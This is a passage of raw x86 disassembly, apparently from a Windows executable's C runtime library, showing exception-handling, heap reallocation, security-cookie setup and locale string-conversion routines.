  4257e1:	cmp    ecx,DWORD PTR ds:0x45fff0
  4257e7:	jne    0x4257f0
  4257e9:	and    DWORD PTR ds:0x45ffd8,0x0
  4257f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f3:	mov    DWORD PTR [eax],ecx
  4257f5:	lea    eax,[edx+0x4]
  4257f8:	pop    edi
  4257f9:	pop    esi
  4257fa:	pop    ebx
  4257fb:	leave  
  4257fc:	ret    
  4257fd:	int3   
  4257fe:	int3   
  4257ff:	int3   
  425800:	push   esi
  425801:	inc    ebx
  425802:	xor    dh,BYTE PTR [eax]
  425804:	pop    eax
  425805:	inc    ebx
  425806:	xor    BYTE PTR [eax],dh
  425808:	push   ebp
  425809:	mov    ebp,esp
  42580b:	sub    esp,0x8
  42580e:	push   ebx
  42580f:	push   esi
  425810:	push   edi
  425811:	push   ebp
  425812:	cld    
  425813:	mov    ebx,DWORD PTR [ebp+0xc]
  425816:	mov    eax,DWORD PTR [ebp+0x8]
  425819:	test   DWORD PTR [eax+0x4],0x6
  425820:	jne    0x4258a8
  425826:	mov    DWORD PTR [ebp-0x8],eax
  425829:	mov    eax,DWORD PTR [ebp+0x10]
  42582c:	mov    DWORD PTR [ebp-0x4],eax
  42582f:	lea    eax,[ebp-0x8]
  425832:	mov    DWORD PTR [ebx-0x4],eax
  425835:	mov    esi,DWORD PTR [ebx+0xc]
  425838:	mov    edi,DWORD PTR [ebx+0x8]
  42583b:	cmp    esi,0xffffffff
  42583e:	je     0x4258a1
  425840:	lea    ecx,[esi+esi*2]
  425843:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425848:	je     0x42588f
  42584a:	push   esi
  42584b:	push   ebp
  42584c:	lea    ebp,[ebx+0x10]
  42584f:	call   DWORD PTR [edi+ecx*4+0x4]
  425853:	pop    ebp
  425854:	pop    esi
  425855:	mov    ebx,DWORD PTR [ebp+0xc]
  425858:	or     eax,eax
  42585a:	je     0x42588f
  42585c:	js     0x42589a
  42585e:	mov    edi,DWORD PTR [ebx+0x8]
  425861:	push   ebx
  425862:	call   0x426790
  425867:	add    esp,0x4
  42586a:	lea    ebp,[ebx+0x10]
  42586d:	push   esi
  42586e:	push   ebx
  42586f:	call   0x4267d2
  425874:	add    esp,0x8
  425877:	lea    ecx,[esi+esi*2]
  42587a:	push   0x1
  42587c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425880:	call   0x426866
  425885:	mov    eax,DWORD PTR [edi+ecx*4]
  425888:	mov    DWORD PTR [ebx+0xc],eax
  42588b:	call   DWORD PTR [edi+ecx*4+0x8]
  42588f:	mov    edi,DWORD PTR [ebx+0x8]
  425892:	lea    ecx,[esi+esi*2]
  425895:	mov    esi,DWORD PTR [edi+ecx*4]
  425898:	jmp    0x42583b
  42589a:	mov    eax,0x0
  42589f:	jmp    0x4258bd
  4258a1:	mov    eax,0x1
  4258a6:	jmp    0x4258bd
  4258a8:	push   ebp
  4258a9:	lea    ebp,[ebx+0x10]
  4258ac:	push   0xffffffff
  4258ae:	push   ebx
  4258af:	call   0x4267d2
  4258b4:	add    esp,0x8
  4258b7:	pop    ebp
  4258b8:	mov    eax,0x1
  4258bd:	pop    ebp
  4258be:	pop    edi
  4258bf:	pop    esi
  4258c0:	pop    ebx
  4258c1:	mov    esp,ebp
  4258c3:	pop    ebp
  4258c4:	ret    
  4258c5:	push   ebp
  4258c6:	mov    ecx,DWORD PTR [esp+0x8]
  4258ca:	mov    ebp,DWORD PTR [ecx]
  4258cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258cf:	push   eax
  4258d0:	mov    eax,DWORD PTR [ecx+0x18]
  4258d3:	push   eax
  4258d4:	call   0x4267d2
  4258d9:	add    esp,0x8
  4258dc:	pop    ebp
  4258dd:	ret    0x4
  4258e0:	call   0x4237f3
  4258e5:	add    eax,0x8
  4258e8:	ret    
  4258e9:	push   0x14
  4258eb:	push   0x4287a8
  4258f0:	call   0x423940
  4258f5:	mov    edi,DWORD PTR [ebp+0x8]
  4258f8:	xor    ebx,ebx
  4258fa:	cmp    edi,ebx
  4258fc:	jne    0x42590c
  4258fe:	push   DWORD PTR [ebp+0xc]
  425901:	call   0x424662
  425906:	pop    ecx
  425907:	jmp    0x425a90
  42590c:	mov    esi,DWORD PTR [ebp+0xc]
  42590f:	cmp    esi,ebx
  425911:	jne    0x42591f
  425913:	push   edi
  425914:	call   0x42454a
  425919:	pop    ecx
  42591a:	jmp    0x425a8e
  42591f:	cmp    DWORD PTR ds:0x460224,0x3
  425926:	jne    0x425a5a
  42592c:	mov    DWORD PTR [ebp-0x1c],ebx
  42592f:	cmp    esi,0xffffffe0
  425932:	ja     0x425a29
  425938:	push   0x4
  42593a:	call   0x423aff
  42593f:	pop    ecx
  425940:	mov    DWORD PTR [ebp-0x4],ebx
  425943:	push   edi
  425944:	call   0x424d22
  425949:	pop    ecx
  42594a:	mov    DWORD PTR [ebp-0x20],eax
  42594d:	cmp    eax,ebx
  42594f:	je     0x4259f9
  425955:	cmp    esi,DWORD PTR ds:0x45ffe4
  42595b:	ja     0x4259a9
  42595d:	push   esi
  42595e:	push   edi
  42595f:	push   eax
  425960:	call   0x425222
  425965:	add    esp,0xc
  425968:	test   eax,eax
  42596a:	je     0x425971
  42596c:	mov    DWORD PTR [ebp-0x1c],edi
  42596f:	jmp    0x4259a9
  425971:	push   esi
  425972:	call   0x425501
  425977:	pop    ecx
  425978:	mov    DWORD PTR [ebp-0x1c],eax
  42597b:	cmp    eax,ebx
  42597d:	je     0x4259a9
  42597f:	mov    eax,DWORD PTR [edi-0x4]
  425982:	dec    eax
  425983:	mov    DWORD PTR [ebp-0x24],eax
  425986:	cmp    eax,esi
  425988:	jb     0x42598c
  42598a:	mov    eax,esi
  42598c:	push   eax
  42598d:	push   edi
  42598e:	push   DWORD PTR [ebp-0x1c]
  425991:	call   0x424680
  425996:	push   edi
  425997:	call   0x424d22
  42599c:	mov    DWORD PTR [ebp-0x20],eax
  42599f:	push   edi
  4259a0:	push   eax
  4259a1:	call   0x424d4d
  4259a6:	add    esp,0x18
  4259a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259ac:	jne    0x4259f9
  4259ae:	cmp    esi,ebx
  4259b0:	jne    0x4259b8
  4259b2:	xor    esi,esi
  4259b4:	inc    esi
  4259b5:	mov    DWORD PTR [ebp+0xc],esi
  4259b8:	add    esi,0xf
  4259bb:	and    esi,0xfffffff0
  4259be:	mov    DWORD PTR [ebp+0xc],esi
  4259c1:	push   esi
  4259c2:	push   ebx
  4259c3:	push   DWORD PTR ds:0x460220
  4259c9:	call   DWORD PTR ds:0x4280d8
  4259cf:	mov    DWORD PTR [ebp-0x1c],eax
  4259d2:	cmp    eax,ebx
  4259d4:	je     0x4259f9
  4259d6:	mov    eax,DWORD PTR [edi-0x4]
  4259d9:	dec    eax
  4259da:	mov    DWORD PTR [ebp-0x24],eax
  4259dd:	cmp    eax,esi
  4259df:	jb     0x4259e3
  4259e1:	mov    eax,esi
  4259e3:	push   eax
  4259e4:	push   edi
  4259e5:	push   DWORD PTR [ebp-0x1c]
  4259e8:	call   0x424680
  4259ed:	push   edi
  4259ee:	push   DWORD PTR [ebp-0x20]
  4259f1:	call   0x424d4d
  4259f6:	add    esp,0x14
  4259f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fd:	call   0x425a51
  425a02:	cmp    DWORD PTR [ebp-0x20],ebx
  425a05:	jne    0x425a29
  425a07:	cmp    esi,ebx
  425a09:	jne    0x425a0e
  425a0b:	xor    esi,esi
  425a0d:	inc    esi
  425a0e:	add    esi,0xf
  425a11:	and    esi,0xfffffff0
  425a14:	mov    DWORD PTR [ebp+0xc],esi
  425a17:	push   esi
  425a18:	push   edi
  425a19:	push   ebx
  425a1a:	push   DWORD PTR ds:0x460220
  425a20:	call   DWORD PTR ds:0x4280e0
  425a26:	mov    DWORD PTR [ebp-0x1c],eax
  425a29:	mov    eax,DWORD PTR [ebp-0x1c]
  425a2c:	cmp    eax,ebx
  425a2e:	jne    0x425a90
  425a30:	cmp    DWORD PTR ds:0x45fea8,ebx
  425a36:	je     0x425a90
  425a38:	push   esi
  425a39:	call   0x426222
  425a3e:	pop    ecx
  425a3f:	test   eax,eax
  425a41:	jne    0x42592c
  425a47:	jmp    0x425a8e
  425a49:	xor    ebx,ebx
  425a4b:	mov    esi,DWORD PTR [ebp+0xc]
  425a4e:	mov    edi,DWORD PTR [ebp+0x8]
  425a51:	push   0x4
  425a53:	call   0x423a6b
  425a58:	pop    ecx
  425a59:	ret    
  425a5a:	xor    eax,eax
  425a5c:	cmp    esi,0xffffffe0
  425a5f:	ja     0x425a77
  425a61:	cmp    esi,ebx
  425a63:	jne    0x425a68
  425a65:	xor    esi,esi
  425a67:	inc    esi
  425a68:	push   esi
  425a69:	push   edi
  425a6a:	push   ebx
  425a6b:	push   DWORD PTR ds:0x460220
  425a71:	call   DWORD PTR ds:0x4280e0
  425a77:	cmp    eax,ebx
  425a79:	jne    0x425a90
  425a7b:	cmp    DWORD PTR ds:0x45fea8,ebx
  425a81:	je     0x425a90
  425a83:	push   esi
  425a84:	call   0x426222
  425a89:	pop    ecx
  425a8a:	test   eax,eax
  425a8c:	jne    0x425a5a
  425a8e:	xor    eax,eax
  425a90:	call   0x42397b
  425a95:	ret    
  425a96:	push   0x10
  425a98:	push   0x4287b8
  425a9d:	call   0x423940
  425aa2:	cmp    DWORD PTR ds:0x460224,0x3
  425aa9:	jne    0x425ae5
  425aab:	push   0x4
  425aad:	call   0x423aff
  425ab2:	pop    ecx
  425ab3:	and    DWORD PTR [ebp-0x4],0x0
  425ab7:	mov    esi,DWORD PTR [ebp+0x8]
  425aba:	push   esi
  425abb:	call   0x424d22
  425ac0:	pop    ecx
  425ac1:	mov    DWORD PTR [ebp-0x1c],eax
  425ac4:	test   eax,eax
  425ac6:	je     0x425ad3
  425ac8:	mov    esi,DWORD PTR [esi-0x4]
  425acb:	sub    esi,0x9
  425ace:	mov    DWORD PTR [ebp-0x20],esi
  425ad1:	jmp    0x425ad6
  425ad3:	mov    esi,DWORD PTR [ebp-0x20]
  425ad6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ada:	call   0x425b03
  425adf:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ae3:	jne    0x425af8
  425ae5:	push   DWORD PTR [ebp+0x8]
  425ae8:	push   0x0
  425aea:	push   DWORD PTR ds:0x460220
  425af0:	call   DWORD PTR ds:0x4280e4
  425af6:	mov    esi,eax
  425af8:	mov    eax,esi
  425afa:	call   0x42397b
  425aff:	ret    
  425b00:	mov    esi,DWORD PTR [ebp-0x20]
  425b03:	push   0x4
  425b05:	call   0x423a6b
  425b0a:	pop    ecx
  425b0b:	ret    
  425b0c:	push   ebp
  425b0d:	mov    ebp,esp
  425b0f:	sub    esp,0x10
  425b12:	push   esi
  425b13:	lea    eax,[ebp-0x8]
  425b16:	push   eax
  425b17:	call   DWORD PTR ds:0x4280f0
  425b1d:	mov    esi,DWORD PTR [ebp-0x4]
  425b20:	xor    esi,DWORD PTR [ebp-0x8]
  425b23:	call   DWORD PTR ds:0x428044
  425b29:	xor    esi,eax
  425b2b:	call   DWORD PTR ds:0x4280a4
  425b31:	xor    esi,eax
  425b33:	call   DWORD PTR ds:0x4280ec
  425b39:	xor    esi,eax
  425b3b:	lea    eax,[ebp-0x10]
  425b3e:	push   eax
  425b3f:	call   DWORD PTR ds:0x4280e8
  425b45:	mov    eax,DWORD PTR [ebp-0xc]
  425b48:	xor    eax,DWORD PTR [ebp-0x10]
  425b4b:	xor    esi,eax
  425b4d:	mov    DWORD PTR ds:0x45f510,esi
  425b53:	jne    0x425b5f
  425b55:	mov    DWORD PTR ds:0x45f510,0xbb40e64e
  425b5f:	pop    esi
  425b60:	leave  
  425b61:	ret    
  425b62:	push   0x118
  425b67:	push   0x428968
  425b6c:	call   0x423940
  425b71:	mov    eax,ds:0x45f510
  425b76:	xor    eax,DWORD PTR [ebp+0x4]
  425b79:	mov    DWORD PTR [ebp-0x1c],eax
  425b7c:	mov    eax,ds:0x45fe78
  425b81:	xor    ecx,ecx
  425b83:	cmp    eax,ecx
  425b85:	je     0x425ba6
  425b87:	mov    DWORD PTR [ebp-0x4],ecx
  425b8a:	push   DWORD PTR [ebp+0xc]
  425b8d:	push   DWORD PTR [ebp+0x8]
  425b90:	call   eax
  425b92:	pop    ecx
  425b93:	pop    ecx
  425b94:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b98:	jmp    0x425ca4
  425b9d:	xor    eax,eax
  425b9f:	inc    eax
  425ba0:	ret    
  425ba1:	mov    esp,DWORD PTR [ebp-0x18]
  425ba4:	jmp    0x425b94
  425ba6:	mov    eax,DWORD PTR [ebp+0x8]
  425ba9:	dec    eax
  425baa:	je     0x425bbf
  425bac:	mov    edi,0x428944
  425bb1:	mov    DWORD PTR [ebp-0x20],0x428890
  425bb8:	mov    esi,0xd4
  425bbd:	jmp    0x425bd0
  425bbf:	mov    edi,0x428870
  425bc4:	mov    DWORD PTR [ebp-0x20],0x4287d0
  425bcb:	mov    esi,0xb9
  425bd0:	mov    BYTE PTR [ebp-0x24],cl
  425bd3:	push   0x104
  425bd8:	lea    eax,[ebp-0x128]
  425bde:	push   eax
  425bdf:	push   ecx
  425be0:	call   DWORD PTR ds:0x428074
  425be6:	test   eax,eax
  425be8:	jne    0x425bfd
  425bea:	push   0x4284c4
  425bef:	lea    eax,[ebp-0x128]
  425bf5:	push   eax
  425bf6:	call   0x423d20
  425bfb:	pop    ecx
  425bfc:	pop    ecx
  425bfd:	lea    ebx,[ebp-0x128]
  425c03:	lea    eax,[ebp-0x128]
  425c09:	push   eax
  425c0a:	call   0x423f50
  425c0f:	pop    ecx
  425c10:	add    eax,0xb
  425c13:	cmp    eax,0x3c
  425c16:	jbe    0x425c41
  425c18:	lea    eax,[ebp-0x128]
  425c1e:	push   eax
  425c1f:	call   0x423f50
  425c24:	mov    ebx,eax
  425c26:	lea    eax,[ebp-0x128]
  425c2c:	sub    eax,0x31
  425c2f:	add    ebx,eax
  425c31:	push   0x3
  425c33:	push   0x4284c0
  425c38:	push   ebx
  425c39:	call   0x423e20
  425c3e:	add    esp,0x10
  425c41:	push   ebx
  425c42:	call   0x423f50
  425c47:	pop    ecx
  425c48:	lea    eax,[eax+esi*1+0xc]
  425c4c:	add    eax,0x3
  425c4f:	and    eax,0xfffffffc
  425c52:	call   0x423990
  425c57:	mov    DWORD PTR [ebp-0x18],esp
  425c5a:	mov    esi,esp
  425c5c:	push   edi
  425c5d:	push   esi
  425c5e:	call   0x423d20
  425c63:	mov    edi,0x4284a0
  425c68:	push   edi
  425c69:	push   esi
  425c6a:	call   0x423d30
  425c6f:	push   0x4287c4
  425c74:	push   esi
  425c75:	call   0x423d30
  425c7a:	push   ebx
  425c7b:	push   esi
  425c7c:	call   0x423d30
  425c81:	push   edi
  425c82:	push   esi
  425c83:	call   0x423d30
  425c88:	push   DWORD PTR [ebp-0x20]
  425c8b:	push   esi
  425c8c:	call   0x423d30
  425c91:	push   0x12010
  425c96:	push   0x428478
  425c9b:	push   esi
  425c9c:	call   0x423c22
  425ca1:	add    esp,0x3c
  425ca4:	push   0x3
  425ca6:	call   0x422dac
  425cab:	int3   
  425cac:	push   0x38
  425cae:	push   0x428d88
  425cb3:	call   0x423940
  425cb8:	xor    ebx,ebx
  425cba:	cmp    DWORD PTR ds:0x45fe9c,ebx
  425cc0:	jne    0x425cfa
  425cc2:	push   ebx
  425cc3:	push   ebx
  425cc4:	xor    esi,esi
  425cc6:	inc    esi
  425cc7:	push   esi
  425cc8:	push   0x428d84
  425ccd:	push   0x100
  425cd2:	push   ebx
  425cd3:	call   DWORD PTR ds:0x4280fc
  425cd9:	test   eax,eax
  425cdb:	je     0x425ce5
  425cdd:	mov    DWORD PTR ds:0x45fe9c,esi
  425ce3:	jmp    0x425cfa
  425ce5:	call   DWORD PTR ds:0x428018
  425ceb:	cmp    eax,0x78
  425cee:	jne    0x425cfa
  425cf0:	mov    DWORD PTR ds:0x45fe9c,0x2
  425cfa:	cmp    DWORD PTR [ebp+0x14],ebx
  425cfd:	jle    0x425d1a
  425cff:	mov    ecx,DWORD PTR [ebp+0x14]
  425d02:	mov    eax,DWORD PTR [ebp+0x10]
  425d05:	dec    ecx
  425d06:	cmp    BYTE PTR [eax],bl
  425d08:	je     0x425d12
  425d0a:	inc    eax
  425d0b:	cmp    ecx,ebx
  425d0d:	jne    0x425d05
  425d0f:	or     ecx,0xffffffff
  425d12:	or     eax,0xffffffff
  425d15:	sub    eax,ecx
  425d17:	add    DWORD PTR [ebp+0x14],eax
  425d1a:	mov    eax,ds:0x45fe9c
  425d1f:	cmp    eax,0x2
  425d22:	je     0x425f04
  425d28:	cmp    eax,ebx
  425d2a:	je     0x425f04
  425d30:	cmp    eax,0x1
  425d33:	jne    0x425f37
  425d39:	xor    edi,edi
  425d3b:	mov    DWORD PTR [ebp-0x1c],edi
  425d3e:	mov    DWORD PTR [ebp-0x20],ebx
  425d41:	mov    DWORD PTR [ebp-0x24],ebx
  425d44:	cmp    DWORD PTR [ebp+0x20],ebx
  425d47:	jne    0x425d51
  425d49:	mov    eax,ds:0x45fe94
  425d4e:	mov    DWORD PTR [ebp+0x20],eax
  425d51:	push   ebx
  425d52:	push   ebx
  425d53:	push   DWORD PTR [ebp+0x14]
  425d56:	push   DWORD PTR [ebp+0x10]
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d5e:	setne  al
  425d61:	lea    eax,[eax*8+0x1]
  425d68:	push   eax
  425d69:	push   DWORD PTR [ebp+0x20]
  425d6c:	call   DWORD PTR ds:0x4280f8
  425d72:	mov    esi,eax
  425d74:	mov    DWORD PTR [ebp-0x28],esi
  425d77:	cmp    esi,ebx
  425d79:	je     0x425f37
  425d7f:	mov    DWORD PTR [ebp-0x4],0x1
  425d86:	lea    eax,[esi+esi*1]
  425d89:	add    eax,0x3
  425d8c:	and    eax,0xfffffffc
  425d8f:	call   0x423990
  425d94:	mov    DWORD PTR [ebp-0x18],esp
  425d97:	mov    eax,esp
  425d99:	mov    DWORD PTR [ebp-0x2c],eax
  425d9c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da0:	jmp    0x425dbd
  425da2:	xor    eax,eax
  425da4:	inc    eax
  425da5:	ret    
  425da6:	mov    esp,DWORD PTR [ebp-0x18]
  425da9:	call   0x426dd5
  425dae:	xor    ebx,ebx
  425db0:	mov    DWORD PTR [ebp-0x2c],ebx
  425db3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dba:	mov    esi,DWORD PTR [ebp-0x28]
  425dbd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dc0:	jne    0x425dde
  425dc2:	lea    eax,[esi+esi*1]
  425dc5:	push   eax
  425dc6:	call   0x424662
  425dcb:	pop    ecx
  425dcc:	mov    DWORD PTR [ebp-0x2c],eax
  425dcf:	cmp    eax,ebx
  425dd1:	je     0x425f37
  425dd7:	mov    DWORD PTR [ebp-0x20],0x1
  425dde:	push   esi
  425ddf:	push   DWORD PTR [ebp-0x2c]
  425de2:	push   DWORD PTR [ebp+0x14]
  425de5:	push   DWORD PTR [ebp+0x10]
  425de8:	push   0x1
  425dea:	push   DWORD PTR [ebp+0x20]
  425ded:	call   DWORD PTR ds:0x4280f8
  425df3:	test   eax,eax
  425df5:	je     0x425ee1
  425dfb:	push   ebx
  425dfc:	push   ebx
  425dfd:	push   esi
  425dfe:	push   DWORD PTR [ebp-0x2c]
  425e01:	push   DWORD PTR [ebp+0xc]
  425e04:	push   DWORD PTR [ebp+0x8]
  425e07:	call   DWORD PTR ds:0x4280fc
  425e0d:	mov    edi,eax
  425e0f:	mov    DWORD PTR [ebp-0x1c],edi
  425e12:	cmp    edi,ebx
  425e14:	je     0x425ee1
  425e1a:	test   BYTE PTR [ebp+0xd],0x4
  425e1e:	je     0x425e4d
  425e20:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e23:	je     0x425ee1
  425e29:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e2c:	jg     0x425ee1
  425e32:	push   DWORD PTR [ebp+0x1c]
  425e35:	push   DWORD PTR [ebp+0x18]
  425e38:	push   esi
  425e39:	push   DWORD PTR [ebp-0x2c]
  425e3c:	push   DWORD PTR [ebp+0xc]
  425e3f:	push   DWORD PTR [ebp+0x8]
  425e42:	call   DWORD PTR ds:0x4280fc
  425e48:	jmp    0x425ee1
  425e4d:	mov    DWORD PTR [ebp-0x4],0x2
  425e54:	lea    eax,[edi+edi*1]
  425e57:	add    eax,0x3
  425e5a:	and    eax,0xfffffffc
  425e5d:	call   0x423990
  425e62:	mov    DWORD PTR [ebp-0x18],esp
  425e65:	mov    eax,esp
  425e67:	mov    DWORD PTR [ebp-0x30],eax
  425e6a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e6e:	jmp    0x425e8b
  425e70:	xor    eax,eax
  425e72:	inc    eax
  425e73:	ret    
  425e74:	mov    esp,DWORD PTR [ebp-0x18]
  425e77:	call   0x426dd5
  425e7c:	xor    ebx,ebx
  425e7e:	mov    DWORD PTR [ebp-0x30],ebx
  425e81:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e85:	mov    edi,DWORD PTR [ebp-0x1c]
  425e88:	mov    esi,DWORD PTR [ebp-0x28]
  425e8b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e8e:	jne    0x425ea8
  425e90:	lea    eax,[edi+edi*1]
  425e93:	push   eax
  425e94:	call   0x424662
  425e99:	pop    ecx
  425e9a:	mov    DWORD PTR [ebp-0x30],eax
  425e9d:	cmp    eax,ebx
  425e9f:	je     0x425ee1
  425ea1:	mov    DWORD PTR [ebp-0x24],0x1
  425ea8:	push   edi
  425ea9:	push   DWORD PTR [ebp-0x30]
  425eac:	push   esi
  425ead:	push   DWORD PTR [ebp-0x2c]
  425eb0:	push   DWORD PTR [ebp+0xc]
  425eb3:	push   DWORD PTR [ebp+0x8]
  425eb6:	call   DWORD PTR ds:0x4280fc
  425ebc:	test   eax,eax
  425ebe:	je     0x425ee1
  425ec0:	push   ebx
  425ec1:	push   ebx
  425ec2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ec5:	jne    0x425ecb
  425ec7:	push   ebx
  425ec8:	push   ebx
  425ec9:	jmp    0x425ed1
  425ecb:	push   DWORD PTR [ebp+0x1c]
  425ece:	push   DWORD PTR [ebp+0x18]
  425ed1:	push   edi
  425ed2:	push   DWORD PTR [ebp-0x30]
  425ed5:	push   ebx
  425ed6:	push   DWORD PTR [ebp+0x20]
  425ed9:	call   DWORD PTR ds:0x428088
  425edf:	mov    edi,eax
  425ee1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ee4:	je     0x425eef
  425ee6:	push   DWORD PTR [ebp-0x30]
  425ee9:	call   0x42454a
  425eee:	pop    ecx
  425eef:	cmp    DWORD PTR [ebp-0x20],ebx
  425ef2:	je     0x425efd
  425ef4:	push   DWORD PTR [ebp-0x2c]
  425ef7:	call   0x42454a
  425efc:	pop    ecx
  425efd:	mov    eax,edi
  425eff:	jmp    0x42605f
  425f04:	mov    DWORD PTR [ebp-0x34],ebx
  425f07:	xor    edi,edi
  425f09:	mov    DWORD PTR [ebp-0x38],ebx
  425f0c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f0f:	jne    0x425f19
  425f11:	mov    eax,ds:0x45fe84
  425f16:	mov    DWORD PTR [ebp+0x8],eax
  425f19:	cmp    DWORD PTR [ebp+0x20],ebx
  425f1c:	jne    0x425f26
  425f1e:	mov    eax,ds:0x45fe94
  425f23:	mov    DWORD PTR [ebp+0x20],eax
  425f26:	push   DWORD PTR [ebp+0x8]
  425f29:	call   0x426bbd
  425f2e:	pop    ecx
  425f2f:	mov    DWORD PTR [ebp-0x3c],eax
  425f32:	cmp    eax,0xffffffff
  425f35:	jne    0x425f3e
  425f37:	xor    eax,eax
  425f39:	jmp    0x42605f
  425f3e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f41:	je     0x426035
  425f47:	push   ebx
  425f48:	push   ebx
  425f49:	lea    ecx,[ebp+0x14]
  425f4c:	push   ecx
  425f4d:	push   DWORD PTR [ebp+0x10]
  425f50:	push   eax
  425f51:	push   DWORD PTR [ebp+0x20]
  425f54:	call   0x426c06
  425f59:	add    esp,0x18
  425f5c:	mov    DWORD PTR [ebp-0x34],eax
  425f5f:	cmp    eax,ebx
  425f61:	je     0x425f37
  425f63:	push   ebx
  425f64:	push   ebx
  425f65:	push   DWORD PTR [ebp+0x14]
  425f68:	push   eax
  425f69:	push   DWORD PTR [ebp+0xc]
  425f6c:	push   DWORD PTR [ebp+0x8]
  425f6f:	call   DWORD PTR ds:0x4280f4
  425f75:	mov    esi,eax
  425f77:	mov    DWORD PTR [ebp-0x40],esi
  425f7a:	cmp    esi,ebx
  425f7c:	je     0x426024
  425f82:	mov    DWORD PTR [ebp-0x4],ebx
  425f85:	add    eax,0x3
  425f88:	and    eax,0xfffffffc
  425f8b:	call   0x423990
  425f90:	mov    DWORD PTR [ebp-0x18],esp
  425f93:	mov    edi,esp
  425f95:	mov    DWORD PTR [ebp-0x44],edi
  425f98:	push   esi
  425f99:	push   ebx
  425f9a:	push   edi
  425f9b:	call   0x426240
  425fa0:	add    esp,0xc
  425fa3:	jmp    0x425fb5
  425fa5:	xor    eax,eax
  425fa7:	inc    eax
  425fa8:	ret    
  425fa9:	mov    esp,DWORD PTR [ebp-0x18]
  425fac:	call   0x426dd5
  425fb1:	xor    ebx,ebx
  425fb3:	xor    edi,edi
  425fb5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fb9:	cmp    edi,ebx
  425fbb:	jne    0x425fe0
  425fbd:	push   DWORD PTR [ebp-0x40]
  425fc0:	call   0x424662
  425fc5:	pop    ecx
  425fc6:	mov    edi,eax
  425fc8:	cmp    edi,ebx
  425fca:	je     0x425ffd
  425fcc:	push   DWORD PTR [ebp-0x40]
  425fcf:	push   ebx
  425fd0:	push   edi
  425fd1:	call   0x426240
  425fd6:	add    esp,0xc
  425fd9:	mov    DWORD PTR [ebp-0x38],0x1
  425fe0:	push   DWORD PTR [ebp-0x40]
  425fe3:	push   edi
  425fe4:	push   DWORD PTR [ebp+0x14]
  425fe7:	push   DWORD PTR [ebp-0x34]
  425fea:	push   DWORD PTR [ebp+0xc]
  425fed:	push   DWORD PTR [ebp+0x8]
  425ff0:	call   DWORD PTR ds:0x4280f4
  425ff6:	mov    DWORD PTR [ebp-0x40],eax
  425ff9:	cmp    eax,ebx
  425ffb:	jne    0x426001
  425ffd:	xor    esi,esi
  425fff:	jmp    0x426027
  426001:	push   DWORD PTR [ebp+0x1c]
  426004:	push   DWORD PTR [ebp+0x18]
  426007:	lea    eax,[ebp-0x40]
  42600a:	push   eax
  42600b:	push   edi
  42600c:	push   DWORD PTR [ebp+0x20]
  42600f:	push   DWORD PTR [ebp-0x3c]
  426012:	call   0x426c06
  426017:	add    esp,0x18
  42601a:	mov    esi,eax
  42601c:	neg    esi
  42601e:	sbb    esi,esi
  426020:	neg    esi
  426022:	jmp    0x426027
  426024:	mov    esi,DWORD PTR [ebp-0x48]
  426027:	cmp    DWORD PTR [ebp-0x38],ebx
  42602a:	je     0x42604f
  42602c:	push   edi
  42602d:	call   0x42454a
  426032:	pop    ecx
  426033:	jmp    0x42604f
  426035:	push   DWORD PTR [ebp+0x1c]
  426038:	push   DWORD PTR [ebp+0x18]
  42603b:	push   DWORD PTR [ebp+0x14]
  42603e:	push   DWORD PTR [ebp+0x10]
  426041:	push   DWORD PTR [ebp+0xc]
  426044:	push   DWORD PTR [ebp+0x8]
  426047:	call   DWORD PTR ds:0x4280f4
  42604d:	mov    esi,eax
  42604f:	cmp    DWORD PTR [ebp-0x34],ebx
  426052:	je     0x42605d
  426054:	push   DWORD PTR [ebp-0x34]
  426057:	call   0x42454a
  42605c:	pop    ecx
  42605d:	mov    eax,esi
  42605f:	lea    esp,[ebp-0x54]
  426062:	call   0x42397b
  426067:	ret    
  426068:	push   0x1c
  42606a:	push   0x428db0
  42606f:	call   0x423940
  426074:	xor    esi,esi
  426076:	cmp    DWORD PTR ds:0x45fea0,esi
  42607c:	jne    0x4260b3
  42607e:	lea    eax,[ebp-0x1c]
  426081:	push   eax
  426082:	xor    edi,edi
  426084:	inc    edi
  426085:	push   edi
  426086:	push   0x428d84
  42608b:	push   edi
  42608c:	call   DWORD PTR ds:0x428104
  426092:	test   eax,eax
  426094:	je     0x42609e
  426096:	mov    DWORD PTR ds:0x45fea0,edi
  42609c:	jmp    0x4260b3
  42609e:	call   DWORD PTR ds:0x428018
  4260a4:	cmp    eax,0x78
  4260a7:	jne    0x4260b3
  4260a9:	mov    DWORD PTR ds:0x45fea0,0x2
  4260b3:	mov    eax,ds:0x45fea0
  4260b8:	cmp    eax,0x2
  4260bb:	je     0x4261ab
  4260c1:	cmp    eax,esi
  4260c3:	je     0x4261ab
  4260c9:	cmp    eax,0x1
  4260cc:	jne    0x4261d1
  4260d2:	mov    DWORD PTR [ebp-0x20],esi
  4260d5:	mov    DWORD PTR [ebp-0x24],esi
  4260d8:	cmp    DWORD PTR [ebp+0x18],esi
  4260db:	jne    0x4260e5
  4260dd:	mov    eax,ds:0x45fe94
  4260e2:	mov    DWORD PTR [ebp+0x18],eax
  4260e5:	push   esi
  4260e6:	push   esi
  4260e7:	push   DWORD PTR [ebp+0x10]
  4260ea:	push   DWORD PTR [ebp+0xc]
  4260ed:	xor    eax,eax
  4260ef:	cmp    DWORD PTR [ebp+0x20],esi
  4260f2:	setne  al
